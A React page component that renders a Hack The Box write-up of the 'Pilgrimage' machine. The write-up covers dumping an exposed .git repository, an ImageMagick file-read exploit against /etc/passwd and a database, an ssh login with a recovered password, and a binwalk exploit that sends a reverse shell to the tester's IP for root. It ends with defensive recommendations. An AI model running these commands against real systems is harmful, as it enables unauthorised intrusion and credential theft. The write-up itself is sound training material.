import React from 'react';

// Import placeholder images - replace with actual screenshots
import pilgrimageLogo from "../../assets/pilgrimage/logo.jpg"
import hdbBanner from "../../assets/cyber/hdb.png"

import nmapScan from "../../assets/pilgrimage/nmap-scan.png"
import directoryBusting from "../../assets/pilgrimage/directory-busting.png"
import gitDirectory from "../../assets/pilgrimage/git-directory.png"
import gitDumper from "../../assets/pilgrimage/git-dumper.png"

import databaseLocation from "../../assets/pilgrimage/db-location.png"
import magickVersion from "../../assets/pilgrimage/magick-version.png"
import poisonedImage from "../../assets/pilgrimage/payload-content.png"
import hexDecoding from "../../assets/pilgrimage/emily-creds.png"
import passwdFile from "../../assets/pilgrimage/etc-passwd.png"

import sshLogin from "../../assets/pilgrimage/foothold.png"
import psyOutput from "../../assets/pilgrimage/pspy.png"
import malwareScan from "../../assets/pilgrimage/script.png"
import binwalkVersion from "../../assets/pilgrimage/binwalk-version.png"

import rootShell from "../../assets/pilgrimage/root-shell.png"

const Pilgrimage = () => {
    const scrollToSection = (sectionId) => {
        const element = document.getElementById(sectionId);
        if (element) {
            element.scrollIntoView({ behavior: 'smooth', block: 'start' });
        }
    };

    return(
        <div className="w-[100%] bg p-10 flex flex-col justify-center items-center">
                
            <div className="w-[80%] relative bg border-[3px] p-10 flex flex-col items-center rounded bg-[rgba(255,255,255,0.1)]">
                <div className="absolute border right-0 top-0" style={{borderBottomLeftRadius:10}}>
                    <h3 className="text-white p-2 text-[5px] md:text-[12px] md:p-3">Created at: <span className="opacity-80">7/11/2025</span></h3>
                </div>
                <h2 className="text-white text-[30px] md:text-[50px]">Pilgrimage</h2>
                <h2 className="text-white text-[10px] opacity-80 font-thin text-center md:text-[20px]">Welcome to Pilgrimage, an intriguing challenge that showcases the power of git repository leakage and CVE exploitation. Explore ImageMagick arbitrary file read vulnerabilities, git source code analysis, and binwalk remote code execution. This box demonstrates how exposed repositories can reveal critical information and how chained vulnerabilities lead to complete system compromise!</h2>
                
                <div className="flex flex-wrap justify-center gap-2 mt-4">
                    {["git repository leak", "CVE-2022-44268", "ImageMagick exploit", "arbitrary file read", "CVE-2022-4510", "binwalk RCE", "process monitoring"].map((tag, index) => (
                        <span key={index} className="bg-[rgba(255,255,255,0.2)] text-white px-3 py-1 rounded-full text-xs md:text-sm border border-white/30">
                            {tag}
                        </span>
                    ))}
                </div>
            </div>
            
            
            <div className="w-[80%] bg  p-10 flex flex-col items-center rounded ">
                <img className="relative w-[80%]  border-[2px]" src={pilgrimageLogo} alt="pilgrimage landing page" />
                <img className="relative w-[80%] border-[2px]" src={hdbBanner} alt="htb banner" />
            </div>

            
              <div className="relative align-center left-0 right-0 z-50 opacity-100  w-[60%] rounded  backdrop-blur-md border-bold md:mb-[-55px]">
                <div className="max-w-6xl mx-auto px-4 py-3">
                    <div className="flex items-center justify-between">
                        <div className="text-white font-semibold text-lg">
                            Pilgrimage HTB
                        </div>
                        <nav className="hidden md:flex items-center space-x-6 md:px-10">
                            <button 
                                onClick={() => scrollToSection('overview')}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-1 rounded"
                            >
                                Overview
                            </button>
                            <button 
                                onClick={() => scrollToSection('enumeration')}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-1 rounded"
                            >
                                Enumeration
                            </button>
                            <button 
                                onClick={() => scrollToSection('foothold')}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-1 rounded"
                            >
                                Foothold
                            </button>
                            <button 
                                onClick={() => scrollToSection('privilege-escalation')}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-1 rounded"
                            >
                                Privesc
                            </button>
                            <button 
                                onClick={() => scrollToSection('takeaway')}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-1 rounded"
                            >
                                Takeaway
                            </button>
                        </nav>
                        
                        {/* Mobile Menu Button */}
                        <div className="md:hidden">
                            <button 
                                id="mobile-menu-btn"
                                onClick={() => {
                                    const menu = document.getElementById('mobile-menu');
                                    menu.classList.toggle('hidden');
                                }}
                                className="text-white hover:bg-white/10 p-2 rounded"
                            >
                                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 6h16M4 12h16M4 18h16" />
                                </svg>
                            </button>
                        </div>
                    </div>
                    
                    {/* Mobile Menu */}
                    <div id="mobile-menu" className="hidden md:hidden mt-3 pb-3 border-t border-white/10 pt-3">
                        <div className="flex flex-col space-y-2">
                            <button 
                                onClick={() => {
                                    scrollToSection('overview');
                                    document.getElementById('mobile-menu').classList.add('hidden');
                                }}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-2 rounded text-left"
                            >
                                Overview
                            </button>
                            <button 
                                onClick={() => {
                                    scrollToSection('enumeration');
                                    document.getElementById('mobile-menu').classList.add('hidden');
                                }}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-2 rounded text-left"
                            >
                                Enumeration
                            </button>
                            <button 
                                onClick={() => {
                                    scrollToSection('foothold');
                                    document.getElementById('mobile-menu').classList.add('hidden');
                                }}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-2 rounded text-left"
                            >
                                Foothold
                            </button>
                            <button 
                                onClick={() => {
                                    scrollToSection('privilege-escalation');
                                    document.getElementById('mobile-menu').classList.add('hidden');
                                }}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-2 rounded text-left"
                            >
                                Privesc
                            </button>
                            <button 
                                onClick={() => {
                                    scrollToSection('takeaway');
                                    document.getElementById('mobile-menu').classList.add('hidden');
                                }}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-2 rounded text-left"
                            >
                                Takeaway
                            </button>
                        </div>
                    </div>
                </div>
                </div>
          

            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />

            <div id="enumeration" className="w-[100%] flex flex-col items-center mt-20">
                <h1 className="text-white text-[25px] font-medium md:text-[40px]">Enumeration</h1>
                
                <div className="w-[80%] mt-8 text-white md:mt-[80px]">
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Let's start with an <span className="text-yellow-400">nmap</span> scan to see open ports
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            export RHOST=10.10.11.239
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            sudo nmap $RHOST -p- -sVC -oN nmap/tcp.txt
                        </code>
                    </div>
                    
                    <img className="w-full border-[2px] relative border-white/30 rounded mb-6" src={nmapScan} alt="nmap scan results" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        We see that it's hosting a webapp with the domain of <span className="text-blue-400">pilgrimage.htb</span>. Let's put it into the <span className="text-yellow-400">/etc/hosts</span> file for DNS resolution and visit the website
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            sudo sh -c 'echo "10.10.11.239 pilgrimage.htb" >> /etc/hosts'
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            firefox http://$RHOST
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Upon visit we see an upload field and a way for us to create an account. I tried my <span className="text-red-400 font-semibold">file upload attack</span> enumeration, but it got me nowhere as the file was converted making it impossible to upload a webshell or reverse shell. My other idea was <span className="text-yellow-400">command injection</span> seeing whether I can escape when the image is being processed and execute a <span className="text-blue-400">system command</span> but it also got me nowhere.
                    </p>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Then I tried making an account but it seems it does not make a difference but it does indicate that there is a <span className="text-blue-400">database present</span>
                    </p>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        So my next step was to do <span className="text-yellow-400">directory busting</span> with ffuf
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            ffuf -w /usr/share/wordlists/dirb/common.txt -u http://$RHOST/FUZZ
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Everything gives code 301 so it limits us to know possible directories. So I did
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={directoryBusting} alt="directory busting results" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Okay finally something interesting - a leaked <span className="text-red-400">.git repository</span>
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={gitDirectory} alt="git directory" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        It's not visible from the browser so simply downloading the .git file and trying to restore it won't work. For this exact situation I have a tool in my toolbox to dump a .git directory which is <span className="text-yellow-400">git-dumper</span>
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            python3 git_dumper.py http://pilgrimage.htb/.git dumped_repo
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            cd dumped_repo
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Now we dumped the repository successfully
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={gitDumper} alt="git dumper output" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Enumerating the files I found a few interesting leaked information
                    </p>
                    
                    <p className="text-sm md:text-base mb-4 opacity-90">1. The first is a <span className="text-blue-400">database location</span> - present in <span className="text-yellow-400">index.php</span> and <span className="text-yellow-400">login.php</span></p>
                    
                    <img className="w-[1000px] relative border-[2px] border-white/30 rounded mb-6" src={databaseLocation} alt="database location" />
                    
                    <p className="text-sm md:text-base mb-4 opacity-90">2. How the website executes the conversion with a tool <span className="text-red-400">magick</span> - in <span className="text-yellow-400">index.php</span></p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6 overflow-x-auto">
                        <pre className="text-green-400 text-xs md:text-sm">
{`exec("/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/" \\
. $upload->getName() \\
. $mime \\
. " -resize 50% /var/www/pilgrimage.htb/shrunk/" \\
. $newname . $mime);`}
                        </pre>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        We can see that this tool is within our dumped repository and we can also see its version
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            magick --version
                        </code>
                    </div>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={magickVersion} alt="magick version" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Searching on google for a known vulnerability shows a neat exploit - <span className="text-red-400 font-semibold">CVE-2022-44268 Arbitrary File Read</span> - There is a POC made by a trustful user on github
                    </p>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        <span className="text-blue-400">https://github.com/kljunowsky/CVE-2022-44268/blob/main/README.md</span>
                    </p>
                </div>
            </div>

            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />

            <div id="foothold" className="w-[100%] flex flex-col items-center mt-10">
                <h1 className="text-white text-[25px] font-medium md:text-[40px] md:mb-5">Foothold</h1>
                
                <div className="w-[80%] mt-8 text-white">
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        So let's implement it where it would take an image file in and it would make a poisoned png that once we upload we can read <span className="text-red-400">files on the system</span>. Let's also combine it with something we already know which is the <span className="text-blue-400">database location</span>
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6 overflow-x-auto">
                        <pre className="text-green-400 text-xs md:text-sm">
{`python3 CVE-2022-44268.py --image imagetopoison.png \\
--file-to-read /var/db/pilgrimage --output poisoned.png`}
                        </pre>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Once we upload the malicious <span className="text-yellow-400">.png</span> and let the server convert it the converted new image would contain data about the database
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            wget http://pilgrimage.htb/shrunk/6870384d22577.png
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            identify -verbose 6870384d22577.png
                        </code>
                    </div>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={poisonedImage} alt="poisoned image output" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        We can see that there is something interesting lying inside of our converted image and it seems very likely <span className="text-yellow-400">HEX encoding</span>
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            echo '[ENCODING]' | xxd -p -r
                        </code>
                    </div>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={hexDecoding} alt="hex decoding result" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        After this I checked for users that I can possibly ssh into with the same technique just with <span className="text-blue-400">/etc/passwd</span>
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6 overflow-x-auto">
                        <pre className="text-green-400 text-xs md:text-sm">
{`python3 CVE-2022-44268.py --image imagetopoison.png \\
--file-to-read /etc/passwd --output poisoned.png`}
                        </pre>
                    </div>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={passwdFile} alt="passwd file contents" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        We can see <span className="text-yellow-400">emily</span> is ssh able so lets try with
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-4">
                        <code className="text-green-400 text-sm">
                            emily : emilyabigchonkyboi123
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            emily : abigchonkyboi123
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            ssh emily@10.10.11.219
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        And we get in as <span className="text-green-400">emily</span> !!!
                    </p>
                    
                    <img className="w-80 relative border-[2px] border-white/30 rounded mb-6" src={sshLogin} alt="ssh login as emily" />
                </div>
            </div>

            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />

            <div id="privilege-escalation" className="w-[100%] flex flex-col items-center mt-10">
                <h1 className="text-white text-[30px] font-medium md:text-[40px]">Privilege Escalation</h1>
                
                <div className="w-[80%] mt-8 text-white">
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Doing my usual manual enumeration got me nowhere not even <span className="text-yellow-400">linpeas</span> gave me anything interesting to further enumerate. So as a last resort I checked what are processes that are being ran on the background behind the scenes with <span className="text-blue-400">pspy</span>
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            pspy -p
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        There is something very interesting script run every once in a while by <span className="text-red-400">root UID=0</span> called <span className="text-yellow-400">malwarescan.sh</span>
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={psyOutput} alt="pspy output" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Further investigating this script revels more interesting information towards the full picture
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            cat /usr/sbin/malwarescan.sh
                        </code>
                    </div>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={malwareScan} alt="malware scan script" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        My initial idea was to include a file named with <span className="text-red-400">command injection</span> payload because of the <span className="text-yellow-400">$FILE</span> and put it into <span className="text-blue-400">/var/www/pilgrimage/shrunk</span> but it seems bash is smarter than that because it did not work.
                    </p>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        The other idea was to somehow manipulate the functionality of <span className="text-yellow-400">binwalk</span> binary which is at <span className="text-blue-400">/usr/local/bin/binwalk</span> so we can just type binwalk to use it
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            binwalk -h
                        </code>
                    </div>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={binwalkVersion} alt="binwalk version" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        We can see it's version number and again we can find a CVE for this version - <span className="text-red-400 font-semibold">CVE-2022-4510 - RCE</span>
                    </p>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        <span className="text-blue-400">https://www.exploit-db.com/exploits/51249</span>
                    </p>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Reading and downloading this POC we can see that again it takes in an image and include a <span className="text-red-400">reverse shell</span> into it which allows it to be executed and as we could see <span className="text-yellow-400">root</span> runs this so we could get a shell as root
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            python3 exploit.py test.png [MY_IP] 9443
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        It created a file <span className="text-yellow-400">binwalk_exploit.png</span> which we would include within the <span className="text-blue-400">/var/www/pilgrimage/shrunk</span> and based on our knowledge it would be scanned with the <span className="text-red-400">malwarescan.sh</span> and then with <span className="text-yellow-400">binwalk</span> and then executing our vulnerability
                    </p>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Also let's start listening on our machine
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            nc -lvnp 9443
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Then lets move the file into the proper folder
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            cd /var/www/pilgrimage/shrunk
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            mv /tmp/binwalk_exploit.png .
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Once we move a file into the folder it triggers the scan script to execute and we get a <span className="text-red-400">root shell</span> instantly completing our box !!!
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={rootShell} alt="root shell" />
                </div>
            </div>

            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />

            <div id="takeaway" className="w-[100%] flex flex-col items-center mt-10">
                <h1 className="text-white text-[20px] font-medium md:text-[30px]">Takeaway</h1>
                
                <div className="w-[80%] mt-8 text-white">
                    <div className="bg-[rgba(255,255,255,0.1)] p-6 rounded border border-white/30">
                        <h3 className="text-lg mb-4 text-yellow-400">Key Learning Points:</h3>
                        <ul className="space-y-2 text-sm md:text-base opacity-90">
                            <li>• <span className="text-red-400">Git Repository Exposure:</span> Exposed .git directories can leak critical source code, revealing database locations and application logic</li>
                            <li>• <span className="text-blue-400">ImageMagick Vulnerabilities:</span> CVE-2022-44268 allows arbitrary file reads through malicious PNG files, enabling sensitive data extraction</li>
                            <li>• <span className="text-yellow-400">Version Enumeration:</span> Always check versions of installed software - outdated binaries often contain exploitable vulnerabilities</li>
                            <li>• <span className="text-green-400">Process Monitoring:</span> Tools like pspy reveal background processes and scheduled tasks that may run with elevated privileges</li>
                            <li>• <span className="text-purple-400">Chained Exploits:</span> Combining multiple vulnerabilities (file read + RCE) can lead to complete system compromise</li>
                            <li>• <span className="text-orange-400">Binwalk Exploitation:</span> CVE-2022-4510 demonstrates how file analysis tools can be weaponized for remote code execution</li>
                            <li>• <span className="text-cyan-400">Automated Scanning:</span> Background malware scanners can be exploited by placing malicious files in monitored directories</li>
                        </ul>
                        
                        <h3 className="text-lg mt-6 mb-4 text-yellow-400">Tools Mastered:</h3>
                        <div className="grid grid-cols-2 md:grid-cols-4 gap-4 text-sm">
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-green-400">nmap</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-red-400">ffuf</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-blue-400">git-dumper</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-yellow-400">ImageMagick</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-purple-400">pspy</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-orange-400">binwalk</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-cyan-400">xxd</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-pink-400">identify</span>
                            </div>
                        </div>
                        
                        <div className="mt-6 p-4 bg-[rgba(255,0,0,0.1)] border border-red-400/50 rounded">
                            <p className="text-red-300 text-sm">
                                <strong>Security Insight:</strong> This box demonstrates the critical importance of proper source code management and version control. 
                                The exposed .git repository provided a roadmap for exploitation, while outdated software versions created multiple attack vectors. 
                                The combination of information disclosure through file read vulnerabilities and privilege escalation through automated processes 
                                shows how attackers can chain seemingly minor issues into complete system compromise.
                            </p>
                        </div>
                        
                        <div className="mt-4 p-4 bg-[rgba(0,255,0,0.1)] border border-green-400/50 rounded">
                            <p className="text-green-300 text-sm">
                                <strong>Defensive Recommendations:</strong> Ensure .git directories are never exposed in production environments, 
                                regularly update all software components especially image processing libraries, implement proper access controls for 
                                automated scanning processes, and monitor for unusual file uploads or modifications in sensitive directories.
                            </p>
                        </div>
                    </div>
                </div>
            </div>
            
            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />
            
       
        </div>
    )
}

export default Pilgrimage;